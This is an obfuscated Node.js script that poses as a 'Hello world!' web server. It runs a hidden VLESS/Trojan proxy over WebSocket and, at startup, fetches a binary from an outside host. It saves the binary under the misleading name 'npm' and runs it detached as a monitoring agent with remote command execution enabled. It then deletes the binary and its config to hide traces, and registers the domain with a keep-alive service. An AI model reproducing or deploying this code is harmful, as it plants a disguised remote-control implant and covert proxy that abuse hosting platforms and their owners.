const _0x38672d=_0x104b;function _0x104b(_0x3f90ca,_0x5c429b){_0x3f90ca=_0x3f90ca-0x8a;const _0x3faf3a=_0x3faf();let _0x104b5b=_0x3faf3a[_0x3f90ca];return _0x104b5b;}(function(_0x39afcd,_0x5a9552){const _0x643612=_0x104b,_0x87c9a=_0x39afcd();while(!![]){try{const _0x40cd8a=-parseInt(_0x643612(0xa2))/0x1+parseInt(_0x643612(0xc2))/0x2*(parseInt(_0x643612(0xff))/0x3)+parseInt(_0x643612(0xa3))/0x4+-parseInt(_0x643612(0xc7))/0x5+-parseInt(_0x643612(0xe5))/0x6*(parseInt(_0x643612(0xc5))/0x7)+parseInt(_0x643612(0xee))/0x8*(parseInt(_0x643612(0x8c))/0x9)+parseInt(_0x643612(0xdb))/0xa;if(_0x40cd8a===_0x5a9552)break;else _0x87c9a['push'](_0x87c9a['shift']());}catch(_0x4a0d9a){_0x87c9a['push'](_0x87c9a['shift']());}}}(_0x3faf,0x79ece));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x38672d(0x99)),net=require(_0x38672d(0xd8)),path=require(_0x38672d(0xd2)),crypto=require('crypto'),{Buffer}=require(_0x38672d(0x9d)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x38672d(0xd9)]||_0x38672d(0x8e),NEZHA_SERVER=process['env'][_0x38672d(0xbd)]||'',NEZHA_PORT=process[_0x38672d(0xfa)][_0x38672d(0xb2)]||'',NEZHA_KEY=process[_0x38672d(0xfa)]['NEZHA_KEY']||'',DOMAIN=process[_0x38672d(0xfa)][_0x38672d(0xc3)]||_0x38672d(0xb8),AUTO_ACCESS=process[_0x38672d(0xfa)][_0x38672d(0xb6)]||!![],WSPATH=process[_0x38672d(0xfa)]['WSPATH']||UUID[_0x38672d(0x91)](0x0,0x8),SUB_PATH=process[_0x38672d(0xfa)]['SUB_PATH']||_0x38672d(0xa7),NAME=process[_0x38672d(0xfa)][_0x38672d(0xfb)]||'',PORT=process[_0x38672d(0xfa)][_0x38672d(0xf3)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x902780=_0x38672d;try{const _0x40b7a0=await axios[_0x902780(0xfe)](_0x902780(0x8b)),_0x69938f=_0x40b7a0[_0x902780(0xaf)];ISP=(_0x69938f[_0x902780(0xe3)]+'-'+_0x69938f[_0x902780(0xb5)])[_0x902780(0xdd)](/ /g,'_');}catch(_0x33458d){ISP=_0x902780(0x9a);}};GetISP();const httpServer=http['createServer']((_0x4a9e7d,_0x2c8f74)=>{const _0x10e9b6=_0x38672d;if(_0x4a9e7d[_0x10e9b6(0xe7)]==='/'){const _0x280a6a=path[_0x10e9b6(0xb4)](__dirname,'index.html');fs['readFile'](_0x280a6a,_0x10e9b6(0x9e),(_0x2d28bd,_0x10d6be)=>{const _0x468798=_0x10e9b6;if(_0x2d28bd){_0x2c8f74['writeHead'](0xc8,{'Content-Type':_0x468798(0xf1)}),_0x2c8f74[_0x468798(0xeb)](_0x468798(0xf5));return;}_0x2c8f74[_0x468798(0xd4)](0xc8,{'Content-Type':_0x468798(0xf1)}),_0x2c8f74['end'](_0x10d6be);});return;}else{if(_0x4a9e7d[_0x10e9b6(0xe7)]==='/'+SUB_PATH){const _0x3f8328=NAME?NAME+'-'+ISP:ISP,_0x3a1e70='vless://'+UUID+'@'+DOMAIN+_0x10e9b6(0xb7)+DOMAIN+_0x10e9b6(0xd6)+DOMAIN+_0x10e9b6(0xad)+WSPATH+'#'+_0x3f8328,_0xdc4d69='trojan://'+UUID+'@'+DOMAIN+_0x10e9b6(0x94)+DOMAIN+_0x10e9b6(0xd6)+DOMAIN+_0x10e9b6(0xad)+WSPATH+'#'+_0x3f8328,_0x24409b=_0x3a1e70+'\x0a'+_0xdc4d69,_0xf9620e=Buffer[_0x10e9b6(0x90)](_0x24409b)['toString'](_0x10e9b6(0x9b));_0x2c8f74[_0x10e9b6(0xd4)](0xc8,{'Content-Type':'text/plain'}),_0x2c8f74['end'](_0xf9620e+'\x0a');}else _0x2c8f74[_0x10e9b6(0xd4)](0x194,{'Content-Type':_0x10e9b6(0xe8)}),_0x2c8f74[_0x10e9b6(0xeb)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x38672d(0x102))]({'server':httpServer}),uuid=UUID[_0x38672d(0xdd)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x26c2d3){return new Promise((_0x5a0f9e,_0x2a9b3b)=>{const _0x39af3d=_0x104b;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x39af3d(0x8a)](_0x26c2d3)){_0x5a0f9e(_0x26c2d3);return;}let _0x356d89=0x0;function _0x1774ec(){const _0x5e5b35=_0x39af3d;if(_0x356d89>=DNS_SERVERS['length']){_0x2a9b3b(new Error(_0x5e5b35(0xda)+_0x26c2d3+_0x5e5b35(0xbf)));return;}const _0x4a8622=DNS_SERVERS[_0x356d89];_0x356d89++;const _0x568bb1=_0x5e5b35(0xe2)+encodeURIComponent(_0x26c2d3)+_0x5e5b35(0xce);axios[_0x5e5b35(0xfe)](_0x568bb1,{'timeout':0x1388,'headers':{'Accept':_0x5e5b35(0xcb)}})['then'](_0x1c796d=>{const _0x3ca0e1=_0x5e5b35,_0x36bbd2=_0x1c796d[_0x3ca0e1(0xaf)];if(_0x36bbd2[_0x3ca0e1(0xdc)]===0x0&&_0x36bbd2[_0x3ca0e1(0xae)]&&_0x36bbd2[_0x3ca0e1(0xae)][_0x3ca0e1(0xef)]>0x0){const _0x906842=_0x36bbd2[_0x3ca0e1(0xae)]['find'](_0x216052=>_0x216052['type']===0x1);if(_0x906842){_0x5a0f9e(_0x906842[_0x3ca0e1(0xaf)]);return;}}_0x1774ec();})[_0x5e5b35(0xf2)](_0xa20eb8=>{_0x1774ec();});}_0x1774ec();});}function handleVlessConnection(_0x1b7a1c,_0x5c7195){const _0x4330c2=_0x38672d,[_0x11dcdd]=_0x5c7195,_0x388557=_0x5c7195[_0x4330c2(0x91)](0x1,0x11);if(!_0x388557[_0x4330c2(0xe9)]((_0x24a67f,_0x261eed)=>_0x24a67f==parseInt(uuid[_0x4330c2(0xbe)](_0x261eed*0x2,0x2),0x10)))return![];let _0x43d7f5=_0x5c7195['slice'](0x11,0x12)[_0x4330c2(0x104)]()+0x13;const _0x53b525=_0x5c7195['slice'](_0x43d7f5,_0x43d7f5+=0x2)[_0x4330c2(0xe6)](0x0),_0x167793=_0x5c7195[_0x4330c2(0x91)](_0x43d7f5,_0x43d7f5+=0x1)[_0x4330c2(0x104)](),_0xa851e2=_0x167793==0x1?_0x5c7195[_0x4330c2(0x91)](_0x43d7f5,_0x43d7f5+=0x4)['join']('.'):_0x167793==0x2?new TextDecoder()['decode'](_0x5c7195[_0x4330c2(0x91)](_0x43d7f5+0x1,_0x43d7f5+=0x1+_0x5c7195[_0x4330c2(0x91)](_0x43d7f5,_0x43d7f5+0x1)[_0x4330c2(0x104)]())):_0x167793==0x3?_0x5c7195[_0x4330c2(0x91)](_0x43d7f5,_0x43d7f5+=0x10)[_0x4330c2(0xd1)]((_0xcb7586,_0x3ec821,_0xcb468b,_0x7df138)=>_0xcb468b%0x2?_0xcb7586[_0x4330c2(0xbc)](_0x7df138['slice'](_0xcb468b-0x1,_0xcb468b+0x1)):_0xcb7586,[])['map'](_0x11148a=>_0x11148a[_0x4330c2(0xe6)](0x0)[_0x4330c2(0x100)](0x10))[_0x4330c2(0xb4)](':'):'';_0x1b7a1c[_0x4330c2(0x97)](new Uint8Array([_0x11dcdd,0x0]));const _0x1f8225=createWebSocketStream(_0x1b7a1c);return resolveHost(_0xa851e2)[_0x4330c2(0xf7)](_0x5cb8bb=>{const _0x3c055a=_0x4330c2;net[_0x3c055a(0x8d)]({'host':_0x5cb8bb,'port':_0x53b525},function(){const _0x1a470c=_0x3c055a;this[_0x1a470c(0xde)](_0x5c7195['slice'](_0x43d7f5)),_0x1f8225['on'](_0x1a470c(0x9c),()=>{})[_0x1a470c(0xcd)](this)['on'](_0x1a470c(0x9c),()=>{})[_0x1a470c(0xcd)](_0x1f8225);})['on']('error',()=>{});})[_0x4330c2(0xf2)](_0x238326=>{const _0x36b48b=_0x4330c2;net[_0x36b48b(0x8d)]({'host':_0xa851e2,'port':_0x53b525},function(){const _0xa68b00=_0x36b48b;this[_0xa68b00(0xde)](_0x5c7195['slice'](_0x43d7f5)),_0x1f8225['on'](_0xa68b00(0x9c),()=>{})[_0xa68b00(0xcd)](this)['on'](_0xa68b00(0x9c),()=>{})[_0xa68b00(0xcd)](_0x1f8225);})['on'](_0x36b48b(0x9c),()=>{});}),!![];}function handleTrojanConnection(_0x23dac9,_0x44ecf4){const _0x469a4=_0x38672d;try{if(_0x44ecf4[_0x469a4(0xef)]<0x3a)return![];const _0x1d4a53=_0x44ecf4[_0x469a4(0x91)](0x0,0x38)['toString'](),_0x1e336e=[UUID];let _0x15f53e=null;for(const _0x1665ce of _0x1e336e){const _0x5744a4=crypto[_0x469a4(0xf0)](_0x469a4(0x93))[_0x469a4(0xe1)](_0x1665ce)[_0x469a4(0xe4)](_0x469a4(0xa0));if(_0x5744a4===_0x1d4a53){_0x15f53e=_0x1665ce;break;}}if(!_0x15f53e)return![];let _0xae92b4=0x38;_0x44ecf4[_0xae92b4]===0xd&&_0x44ecf4[_0xae92b4+0x1]===0xa&&(_0xae92b4+=0x2);const _0x1311f2=_0x44ecf4[_0xae92b4];if(_0x1311f2!==0x1)return![];_0xae92b4+=0x1;const _0x11438d=_0x44ecf4[_0xae92b4];_0xae92b4+=0x1;let _0x37e27d,_0x2104b9;if(_0x11438d===0x1)_0x37e27d=_0x44ecf4[_0x469a4(0x91)](_0xae92b4,_0xae92b4+0x4)[_0x469a4(0xb4)]('.'),_0xae92b4+=0x4;else{if(_0x11438d===0x3){const _0x456d2c=_0x44ecf4[_0xae92b4];_0xae92b4+=0x1,_0x37e27d=_0x44ecf4['slice'](_0xae92b4,_0xae92b4+_0x456d2c)[_0x469a4(0x100)](),_0xae92b4+=_0x456d2c;}else{if(_0x11438d===0x4)_0x37e27d=_0x44ecf4['slice'](_0xae92b4,_0xae92b4+0x10)['reduce']((_0xdbb900,_0xf2d52,_0x4dee8d,_0x1b8507)=>_0x4dee8d%0x2?_0xdbb900[_0x469a4(0xbc)](_0x1b8507[_0x469a4(0x91)](_0x4dee8d-0x1,_0x4dee8d+0x1)):_0xdbb900,[])[_0x469a4(0xaa)](_0x3234fd=>_0x3234fd['readUInt16BE'](0x0)[_0x469a4(0x100)](0x10))[_0x469a4(0xb4)](':'),_0xae92b4+=0x10;else return![];}}_0x2104b9=_0x44ecf4[_0x469a4(0xe6)](_0xae92b4),_0xae92b4+=0x2;_0xae92b4<_0x44ecf4[_0x469a4(0xef)]&&_0x44ecf4[_0xae92b4]===0xd&&_0x44ecf4[_0xae92b4+0x1]===0xa&&(_0xae92b4+=0x2);const _0x159cef=createWebSocketStream(_0x23dac9);return resolveHost(_0x37e27d)[_0x469a4(0xf7)](_0x2ce06b=>{const _0x4c427b=_0x469a4;net[_0x4c427b(0x8d)]({'host':_0x2ce06b,'port':_0x2104b9},function(){const _0xbd0e81=_0x4c427b;_0xae92b4<_0x44ecf4[_0xbd0e81(0xef)]&&this[_0xbd0e81(0xde)](_0x44ecf4[_0xbd0e81(0x91)](_0xae92b4)),_0x159cef['on'](_0xbd0e81(0x9c),()=>{})[_0xbd0e81(0xcd)](this)['on']('error',()=>{})[_0xbd0e81(0xcd)](_0x159cef);})['on']('error',()=>{});})['catch'](_0x71df20=>{const _0x781499=_0x469a4;net['connect']({'host':_0x37e27d,'port':_0x2104b9},function(){const _0x15ed13=_0x104b;_0xae92b4<_0x44ecf4[_0x15ed13(0xef)]&&this[_0x15ed13(0xde)](_0x44ecf4['slice'](_0xae92b4)),_0x159cef['on'](_0x15ed13(0x9c),()=>{})[_0x15ed13(0xcd)](this)['on'](_0x15ed13(0x9c),()=>{})['pipe'](_0x159cef);})['on'](_0x781499(0x9c),()=>{});}),!![];}catch(_0x1a4069){return![];}}wss['on'](_0x38672d(0xd5),(_0x123d7f,_0x3d3a96)=>{const _0x38226b=_0x38672d,_0x2654dc=_0x3d3a96['url']||'';_0x123d7f[_0x38226b(0xed)](_0x38226b(0xea),_0x18ace2=>{const _0x48f18c=_0x38226b;if(_0x18ace2[_0x48f18c(0xef)]>0x11&&_0x18ace2[0x0]===0x0){const _0x3a1c58=_0x18ace2['slice'](0x1,0x11),_0x989c41=_0x3a1c58[_0x48f18c(0xe9)]((_0x30f00e,_0x3e243b)=>_0x30f00e==parseInt(uuid[_0x48f18c(0xbe)](_0x3e243b*0x2,0x2),0x10));if(_0x989c41){!handleVlessConnection(_0x123d7f,_0x18ace2)&&_0x123d7f[_0x48f18c(0x92)]();return;}}!handleTrojanConnection(_0x123d7f,_0x18ace2)&&_0x123d7f['close']();})['on'](_0x38226b(0x9c),()=>{});});const getDownloadUrl=()=>{const _0x3f943d=_0x38672d,_0x890915=os[_0x3f943d(0xc1)]();return _0x890915==='arm'||_0x890915===_0x3f943d(0xc0)||_0x890915==='aarch64'?!NEZHA_PORT?_0x3f943d(0xa6):_0x3f943d(0xc8):!NEZHA_PORT?_0x3f943d(0xac):_0x3f943d(0xa4);},downloadFile=async()=>{const _0x3a4ace=_0x38672d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x628c99=getDownloadUrl(),_0x3e4b23=await axios({'method':_0x3a4ace(0xfe),'url':_0x628c99,'responseType':_0x3a4ace(0xc6)}),_0x57ed31=fs[_0x3a4ace(0x96)]('npm');return _0x3e4b23['data'][_0x3a4ace(0xcd)](_0x57ed31),new Promise((_0x31b21a,_0x131101)=>{const _0x5438c8=_0x3a4ace;_0x57ed31['on'](_0x5438c8(0xbb),()=>{const _0x21bed3=_0x5438c8;console['log'](_0x21bed3(0xb9)),exec(_0x21bed3(0xd3),_0x409d70=>{if(_0x409d70)_0x131101(_0x409d70);_0x31b21a();});}),_0x57ed31['on'](_0x5438c8(0x9c),_0x131101);});}catch(_0x17e43c){throw _0x17e43c;}},runnz=async()=>{const _0x24ea5f=_0x38672d;try{const _0x5df283=execSync(_0x24ea5f(0xfd),{'encoding':_0x24ea5f(0xab)});if(_0x5df283[_0x24ea5f(0xf9)]()!==''){console[_0x24ea5f(0xa9)](_0x24ea5f(0xca));return;}}catch(_0x2d45f3){}await downloadFile();let _0x19df18='',_0xe1b7c9=[_0x24ea5f(0xd7),'8443','2096','2087',_0x24ea5f(0xcc),_0x24ea5f(0xa8)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4d59d0=_0xe1b7c9[_0x24ea5f(0xb1)](NEZHA_PORT)?_0x24ea5f(0xec):'';_0x19df18='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x24ea5f(0x101)+NEZHA_KEY+'\x20'+_0x4d59d0+_0x24ea5f(0xfc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4d9eae=NEZHA_SERVER[_0x24ea5f(0xb1)](':')?NEZHA_SERVER[_0x24ea5f(0xa5)](':')[_0x24ea5f(0xf8)]():'',_0x56eb7b=_0xe1b7c9[_0x24ea5f(0xb1)](_0x4d9eae)?_0x24ea5f(0xe0):_0x24ea5f(0xc9),_0x368b16='client_secret:\x20'+NEZHA_KEY+_0x24ea5f(0xf6)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x56eb7b+_0x24ea5f(0xb3)+UUID;fs[_0x24ea5f(0x103)](_0x24ea5f(0xdf),_0x368b16);}_0x19df18=_0x24ea5f(0x9f);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x19df18,{'shell':_0x24ea5f(0xf4)},_0x41bb05=>{const _0x23ce59=_0x24ea5f;if(_0x41bb05)console['error'](_0x23ce59(0xc4),_0x41bb05);else console[_0x23ce59(0xa9)](_0x23ce59(0x95));});}catch(_0x3dacd1){console[_0x24ea5f(0x9c)](_0x24ea5f(0xba)+_0x3dacd1);}};async function addAccessTask(){const _0xd69024=_0x38672d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x223756=_0xd69024(0xa1)+DOMAIN;try{const _0x5e9c91=await axios['post'](_0xd69024(0xb0),{'url':_0x223756},{'headers':{'Content-Type':'application/json'}});console[_0xd69024(0xa9)](_0xd69024(0xcf));}catch(_0x1e47c0){}}const delFiles=()=>{const _0x3535c0=_0x38672d;fs[_0x3535c0(0x98)]('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};function _0x3faf(){const _0x8d54fe=['/bin/bash','Hello\x20world!','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','then','pop','trim','env','NAME','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','get','4527ENOCsf','toString','\x20-p\x20','Server','writeFileSync','readUInt8','test','https://api.ip.sb/geoip','99vjqCxM','connect','001f6de1-9c75-4465-8fd9-1e94495b6061','listen','from','slice','close','sha224',':443?security=tls&sni=','npm\x20is\x20running','createWriteStream','send','unlink','axios','Unknown','base64','error','buffer','utf8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','hex','https://','939025cdqTnz','1224008PmhSFk','https://amd64.ssss.nyc.mn/agent','split','https://arm64.ssss.nyc.mn/v1','sub','2053','log','map','utf-8','https://amd64.ssss.nyc.mn/v1','&path=%2F','Answer','data','https://oooo.serv00.net/add-url','includes','NEZHA_PORT','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','join','isp','AUTO_ACCESS',':443?encryption=none&security=tls&sni=','1234.abc.com','npm\x20download\x20successfully','error:\x20','finish','concat','NEZHA_SERVER','substr','\x20with\x20all\x20DNS\x20servers','arm64','arch','326LSRpEo','DOMAIN','npm\x20running\x20error:','11095OBugkU','stream','1660465ZRvXCd','https://arm64.ssss.nyc.mn/agent','false','npm\x20is\x20already\x20running,\x20skip\x20running...','application/dns-json','2083','pipe','&type=A','Automatic\x20Access\x20Task\x20added\x20successfully','Server\x20is\x20running\x20on\x20port\x20','reduce','path','chmod\x20+x\x20npm','writeHead','connection','&fp=chrome&type=ws&host=','443','net','UUID','Failed\x20to\x20resolve\x20','12489170wnutKu','Status','replace','write','config.yaml','true','update','https://dns.google/resolve?name=','country_code','digest','1266zvICBi','readUInt16BE','url','text/plain','every','message','end','--tls','once','221144HAORCc','length','createHash','text/html','catch','PORT'];_0x3faf=function(){return _0x8d54fe;};return _0x3faf();}httpServer[_0x38672d(0x8f)](PORT,()=>{const _0x3467ca=_0x38672d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3467ca(0xa9)](_0x3467ca(0xd0)+PORT);});
